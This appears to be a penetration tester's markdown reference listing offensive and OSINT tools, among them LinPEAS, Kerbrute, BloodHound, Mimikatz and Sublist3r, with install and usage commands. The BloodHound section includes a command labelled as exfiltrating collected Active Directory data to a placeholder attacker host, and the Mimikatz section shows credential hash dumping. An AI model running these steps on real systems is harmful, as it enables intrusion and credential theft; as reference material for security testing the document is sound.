# Third Party Tools

* [Payloads All The Things](#Payloads-All-The-Things)
* [Payload Box](#Payload-Box)
* [Privilege Escalation Awesome Scripts Suite](#Privilege-Escalation-Awesome-Scripts-Suite)
* [Linux Exploit Suggester](#Linux-Exploit-Suggester)
* [Enum4Linux](#Enum4Linux)
* [GTFOBins](#GTFOBins)
* [OpenBoleto](#OpenBoleto)
* [OpenVAS](#OpenVAS)
* [Nessus](#Nessus)
* [Sherlock](#Sherlock)
* [SpiderFoot](#SpiderFoot)
* [CrackStation](#CrackStation)
* [MD5 Hashing](#MD5-Hashing)
* [Kerbrute](#Kerbrute)
* [BloodHound](#BloodHound)
* [Mimikatz](#Mimikatz)
* [CyberChef](#CyberChef)
* [Wayback Machine](#Wayback-Machine)
* [QR Code Monkey](#QR-Code-Monkey)
* [Sublist3r](#Sublist3r)
* [IPTraf-ng](#IPTraf-ng)
* [EtherApe](#EtherApe)
* [Virus Total](#Virus-Total)
* [GraphQL Voyager](#GraphQL-Voyager)
* [Reverse Shell Generator](#Reverse-Shell-Generator)



# Payloads All The Things

**Repository**: [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
A list of useful payloads and bypasses for Web Application Security.  



# Payload Box

**Repository**: [payloadbox](https://github.com/payloadbox)  
Attack Payloads Only



# Privilege Escalation Awesome Scripts Suite

**Repository**: [carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Here you will find privilege escalation tools for Windows, Linux/Unix and MacOS.  
These tools search for possible local privilege escalation paths that you could exploit.  
So you can recognize the misconfigurations easily.

### Linux/Unix and MacOS

* Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**
* **[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)**

### Windows

* Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
* **[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)**

### Basic Usage

```
# Download Script
$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh

# Run Script
$ chmod +x linpeas.sh
$ ./linpeas.sh | tee linpeas_output.txt

# Read Output
$ less -r linpeas_output.txt
```



# Linux Exploit Suggester

**Repository**: [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)  
LES tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine.  

### Assessing Kernel Exposure on Publicly Known Exploits
For each exploit, exposure is calculated:

* **Highly Probable**: Assessed kernel is most probably affected and there's a very good chance that PoC exploit will work.
* **Probable**: It's possible that exploit will work but most likely customization of PoC exploit will be needed to suit your target.
* **Less Probable**: Additional manual analysis is needed to verify if kernel is affected.
* **Unprobable**: Highly unlikely that kernel is affected (exploit is not displayed in the tool's output)

### Verifying State of Kernel Hardening Security Measures

LES can check for most of security settings available by your Linux kernel.  
This functionality is modern continuation of --kernel switch from checksec.sh tool by *Tobias Klein*.

### Basic Usage

```
# Download Script
$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

# Run Script
$ chmod +x les.sh
$ ./les.sh
```



# Enum4Linux

**Website**: [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux/)  
A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.

### Basic Usage

```
$ enum4linux {TARGET}
```



# GTFOBins

**Repository**: [GTFOBins](https://gtfobins.github.io/)  
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.



# OpenBoleto

**Repository**: [openboleto/openboleto](https://github.com/openboleto/openboleto)

O OpenBoleto é uma biblioteca de código aberto para geração de boletos bancários.  
Boletos bancários são considerados um meio de pagamento muito comum no Brasil.  
O foco é ser simples e ter uma arquitetura compatível com os recursos mais modernos do PHP.

### Basic Usage

```
# Download
$ git clone https://github.com/openboleto/openboleto.git
$ cd ./openboleto/samples/

# Edit fields of your chosen emitter (Banco do Brasil in this example)
$ vi banco_do_brasil.php

# Execute PHP
$ php banco_do_brasil.php > /tmp/boleto.html

# Read Output
$ firefox /tmp/boleto.html &
```



# OpenVAS

**Repository**: [greenbone/openvas-scanner](https://github.com/greenbone/openvas-scanner)  
**WebSite**: [openvas.org](https://www.openvas.org/)

This is the Open Vulnerability Assessment Scanner (OpenVAS) of the Greenbone Vulnerability Management (GVM) Solution.  
It is used for the Greenbone Security Manager appliances and is a full-featured scan engine that executes a continuously updated and extended feed of Network Vulnerability Tests (NVTs).

### Basic Usage

```
# Installation
$ sudo apt-get install openvas

# Initial Setup
$ sudo gvm-setup

# Create a user
$ sudo runuser -u _gvm -- gvmd --create-user=administrator --new-password=12345
User created with password '5aae84fa-f1ec-409d-bf2b-24e3bbc38595'.

# Start Daemon
$ sudo gvm-start

# Web Page: https://127.0.0.1:9392
# Username: administrator
# Password: 5aae84fa-f1ec-409d-bf2b-24e3bbc38595

# Stop Daemon
$ sudo gvm-stop
```



# Nessus

**WebSite**: [tenable/products/nessus](https://www.tenable.com/products/nessus)  
**Download Page**: [Download Nessus](https://www.tenable.com/downloads/nessus)

Nessus is trusted by more than 30,000 organizations worldwide as one of the most widely deployed security technologies on the planet.  
This is the gold standard for vulnerability assessment.

### Basic Usage

```
# Download Nessus
# For Kali 2021: Nessus-8.13.1-debian6_amd64.deb

# Installation
$ sudo dpkg -i Nessus-8.13.1-debian6_amd64.deb

# Start Daemon
$ sudo systemctl start nessusd.service

# Web Page: https://Kali-Burton:8834/

# Get an activation code
# A temporary mail can be used: https://temp-mail.org

# Stop Daemon
$ sudo systemctl stop nessusd.service
```



# Sherlock

**Repository**: [sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)  
**WebSite**: [sherlock-project.github.io](https://sherlock-project.github.io/)

Sherlock can be used to find usernames across many social networks.  
It requires Python 3.6 or higher and works on MacOS, Linux and Windows.

### Basic Usage

```
# Installation
$ git clone https://github.com/sherlock-project/sherlock.git
$ cd sherlock
$ python3 -m pip install -r requirements.txt

# Looking for user: gustavocelani
$ python3 sherlock --timeout 3 gustavocelani
```



# SpiderFoot

**Repository**: [smicallef/spiderfoot](https://github.com/smicallef/spiderfoot)

**SpiderFoot** is an open source intelligence (OSINT) automation tool.  
It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.  
SpiderFoot has an embedded web-server for providing a web-based interface but can also be used completely via the command-line.  
This is also embedded by default in Kali Linux.

### Basic Usage - Kali Linux

```
# Running
$ spiderfoot -l 127.0.0.1:5001

# Accessing
$ firefox 127.0.0.1:5001
```

### Basic Usage - External Installation

```
# Download last stable version
$ wget https://github.com/smicallef/spiderfoot/archive/v3.3.tar.gz

# Extracting
$ tar zxvf v3.3.tar.gz
$ cd spiderfoot

# Inslling requirements
$ pip3 install -r requirements.txt

# Running
$ python3 ./sf.py -l 127.0.0.1:5001

# Accessing
$ firefox 127.0.0.1:5001
```



# CrackStation

**WebSite**: [CrackStation](https://crackstation.net/)

**CrackStation** is a free password hash cracker.  
It uses massive pre-computed lookup tables to crack password hashes.  
These tables store a mapping between the hash of a password, and the correct password for that hash.



# MD5 Hashing

**WebSite**: [MD5 Hashing](https://md5hashing.net/)

Generate hash out of the string and lookup for hash value.  
Get anonymous, random, temporary and disposable email address.  
Encrypt, store, and share text-data.  
Quickly identify hash digest type.



# Kerbrute

**Repository**: [ropnop/kerbrute](https://github.com/ropnop/kerbrute)  
**Releases**: [kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.

### Basic Usage

```
# Downloading
$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386

# Enum Users
$ ./kerbrute_linux_386 userenum --dc {TAGET} -d {DNS} {USERS_FILE}
```



# BloodHound

**Repository**: [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)  
It uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment.

### Basic Usage

Generate and save loot.zip in Windows target machine
```
# Init SharpHound
PS C:\Users\Administrator\Documents> . .\SharpHound.ps1

# Generate loot.zip
PS C:\Users\Administrator\Documents> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

# Exfiltrating loot.zip file
PS C:\Users\Administrator\Documents> scp .\20210425092207_loot.zip {ATTACKER}@{ATTACKER_IP}:{PATH}
```

Rising BloodHound
```
# Install
sudo apt-get install neo4j bloodhound

# Init
$ sudo neo4j console

# Access WEB Page and change default password
# Default User: neo4j
# Default Pass: neo4j
$ firefox http://localhost:7474/

# Start
$ bloodhound

# Now import the loot.zip file into bloodhound UI
```



# Mimikatz

**Repository**: [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)  
This is a tool to make somes experiments with Windows security.

### Basic Usage

```
# Init
PS C:\Users\Administrator\Documents> . .\mimikatz.exe

# Need to run as Administrator
$ privilege::debug 
Privilege '20' OK

# Dump Hashes
$ lsadump::lsa /patch
```



# CyberChef

**WebSite**: [CyberChef](https://gchq.github.io/CyberChef/)  
Vesatile online endocing/secoding tool.



# Wayback Machine

**WebSite**: [archive.org](https://archive.org/web/)  
Websites timeline.



# QR Code Monkey

**WebSite**: [qrcode-monkey.com](https://www.qrcode-monkey.com/)  
The 100% Free QR Code Generator.



# Sublist3r

**Repository**: [aboul3la/Sublist3r](https://github.com/aboul3la/Sublist3r)  
**Sublist3r** is a python tool designed to enumerate subdomains of websites using OSINT.

### Basic Usage

```
# Installation
$ git clone https://github.com/aboul3la/Sublist3r.git
$ cd Sublist3r
$ sudo pip3 install -r requirements.txt

# Run
$ python3 sublist3r.py -d {DOMAIN} -o {DESTINATION_FILE}
```



# IPTraf-ng

**Repository**: [iptraf-ng](https://github.com/iptraf-ng/iptraf-ng)  
**IPTraf-ng** is a console-based network monitoring program for Linux that displays information about IP traffic.

### Basic Usage

```
# Installation
$ sudo apt-get install iptraf-ng

# Run
$ sudo iptraf-ng
```



# EtherApe

**Repository**: [IFGHou/EtherApe](https://github.com/IFGHou/EtherApe)  
**EtherApe** is a network traffic browser that displays network activity graphically.

### Basic Usage

```
# Installation
$ sudo apt-get install etherape

# Run
$ sudo etherape
```



# Virus Total

**WebSite**: [virustotal.com](https://www.virustotal.com/gui/)  
Analyze suspicious files and URLs to detect types of malware, automatically share them with the security community.



# GraphQL Voyager

**WebSite**: [apis.guru/graphql-voyager](https://apis.guru/graphql-voyager/)  
Online GraphQL schema visualizer tool

### Inspectiong GraphQL target's schema

```
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```



# Reverse Shell Generator

**WebSite**: [revshells.com](https://www.revshells.com/)  
Online reverse shell payload command generator

________________________
